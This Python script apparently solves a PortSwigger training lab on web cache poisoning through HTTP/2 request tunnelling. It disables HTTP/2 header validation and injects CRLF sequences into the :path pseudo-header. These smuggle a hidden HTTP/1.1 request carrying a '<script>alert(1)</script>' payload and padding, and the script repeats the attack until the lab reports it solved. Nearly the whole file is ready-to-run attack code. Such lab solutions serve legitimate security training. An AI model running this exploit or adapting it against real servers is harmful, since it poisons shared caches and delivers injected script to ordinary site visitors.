# Web cache poisoning via HTTP/2 request tunnelling

# https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import socket
import ssl
import h2.config
import h2.connection
import argparse


TIMEOUT = 14

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def format_h2_headers(method, path, host, headers=None, header_list=None):
	request_headers = [
	(b":scheme", b"https"),
	(b":method", method.encode()),
	(b":path", path.encode()),
	(b":authority", host.encode())
	]
	if headers:
		headers = headers.splitlines()
		for d in headers:
			name, value = d.split(':')
			request_headers.append((name.strip().encode(), value.strip().encode()))
	if header_list:
		request_headers += header_list
	return request_headers

def format_body(body):
	return re.sub(r"(?<!\r)\n", "\r\n", body).encode()

def send_h2_request(host, request_headers, request_content=None, port=443):
	if request_content:
		if type(request_content) == str:
			request_content = request_content.encode()
	socket.setdefaulttimeout(TIMEOUT)

	ctx = ssl.create_default_context()
	ctx.check_hostname = False
	ctx.verify_mode = ssl.CERT_NONE
	ctx.set_alpn_protocols(['h2'])
	
	sock = socket.create_connection((host, port))
	sock = ctx.wrap_socket(sock, server_hostname=host)
	
	config = h2.config.H2Configuration(validate_outbound_headers=False, normalize_outbound_headers=False)
	conn = h2.connection.H2Connection(config=config)
	conn.initiate_connection()
	sock.sendall(conn.data_to_send())
	
	if request_content:
		conn.send_headers(1, request_headers)
		conn.send_data(1, request_content, end_stream=True)
	else:
		conn.send_headers(1, request_headers, end_stream=True)
	sock.sendall(conn.data_to_send())

	body = b""
	response_end = False
	try:
		while not response_end:
			try:
				data = sock.recv(65536 * 1024)
			except socket.timeout:
				socket_timeout = True
				break
			if not data:
				break
			try:
				events = conn.receive_data(data)
			except Exception:
				error_code = "Error"
			if events:
				for event in events:
					if isinstance(event, h2.events.ConnectionTerminated):
						error_code = event.error_code
					elif isinstance(event, h2.events.ResponseReceived):
						response_headers = event.headers
					elif isinstance(event, h2.events.DataReceived):
						conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
						body += event.data
					elif isinstance(event, h2.events.StreamEnded):
						response_body = body
						response_end = True
						break
			sock.sendall(conn.data_to_send())
		conn.close_connection()
		sock.sendall(conn.data_to_send())
		sock.close()
	except socket.timeout:
		socket_timeout = True
	if "response_headers" not in locals():
		response_headers = ""
	if "response_body" not in locals():
		response_body = ""
	if "error_code" not in locals():
		error_code = ""
	if "socket_timeout" not in locals():
		socket_timeout = False
	result = {
	"response_headers": response_headers,
	"response_body": response_body,
	"error_code": error_code,
	"socket_timeout": socket_timeout
	}
	return result

def get_header(resp, header):
	for h in resp['response_headers']:
		if h[0] == header.encode():
			return h[1].decode()

def get_status_code(resp):
	for h in resp['response_headers']:
		if h[0] == b":status":
			return int(h[1].decode())

def get_cookie(resp):
	for h in resp['response_headers']:
		if h[0] == b"set-cookie":
			return h[1].decode().split(';')[0]

def get_length(resp):
	for h in resp['response_headers']:
		if h[0] == b"content-length":
			print('[+] Normal Content-Length:\t%s' % h[1].decode())
			return int(h[1].decode())

def reset_requests(url):
	for t in range(1, 11):
		sys.stdout.flush()
		time.sleep(.5)
		r = send_get_request(url, '/')
		status = get_status_code(r)
		sys.stdout.write('\r[+] Reseting response queue... %s\t=>\t%s' % (str(t), str(status)))
	print('\n')

def send_get_request(host, path):
	method = 'GET'
	headers = format_h2_headers(method, path, host)
	resp = send_h2_request(host, headers)
	return resp

def send_tunnelling_request(host, length, i):
	print('\n[+] Sending Tunnelling Request...')
	payload = "<script>alert(1)</script>"
	padding = "A" * length
	method = 'HEAD'
	path = f'/ HTTP/1.1\r\nHost: {host}\r\n\r\nGET /resources/js?{payload}{padding} HTTP/1.1\r\nFoo: bar'
	headers = format_h2_headers(method, path, host)
	if i == 1:
		print('[+] Using Pseudo-headers:\n\t%s' % headers)
	resp = send_h2_request(host, headers)
	print(str(get_status_code(resp)))
	return resp

def send_cachebuster_requests(host, length, post_id):
	time.sleep(2)
	print('\n[+] Sending Cachebuster Request #1...')
	payload = "<script>alert(1)</script>"
	padding = "A" * (length + 1)
	method = 'HEAD'
	path = f'/?cb=1 HTTP/1.1\r\nHost: {host}\r\n\r\nGET /resources/js?{payload}{padding} HTTP/1.1\r\nFoo: bar'
	headers = format_h2_headers(method, path, host)
	print('[+] Using Pseudo-headers:\n\t%s' % headers)
	resp = send_h2_request(host, headers)
	print(str(get_status_code(resp)))
	time.sleep(2)
	return resp


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Web cache poisoning via HTTP/2 request tunnelling')
	parser = argparse.ArgumentParser(description="[+] Lab: Web cache poisoning via HTTP/2 request tunnelling")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	if parsed_url.port:
		port = parsed_url.port
	elif parsed_url.scheme == "https":
		port = 443
	elif parsed_url.scheme == "http":
		port = 80
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send HTTP Request Tunnelling attack...\n')
			time.sleep(1)
			print('[+] Getting Content-Length of a normal GET request...')		
			resp = send_get_request(host, '/')
			status = get_status_code(resp)
			print(status)
			length = get_length(resp)
			solved = False
			post_id = 1
			while solved is False:
				if resp:
					if solved == False:
						reset_requests(host)
					print('[+] Using Content-Length value as padding to build the payload...')
					time.sleep(1)
					send_cachebuster_requests(host, length, post_id)
					for i in range(1, 9):
						time.sleep(1)
						resp = send_tunnelling_request(host, length, i)
						status = get_status_code(resp)
						print(status)
						print(resp['response_headers'])
						if status == "200":
							if int(get_header(resp, 'content-length')) > length:
								print('WAIT...')
								time.sleep(5)
						time.sleep(TIMEOUT)
						r = s.get(url)
						print(r)
						if 'Congratulations, you solved the lab!' in r.text:
							print('[+] The lab is solved !')
							solved = True
							break
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
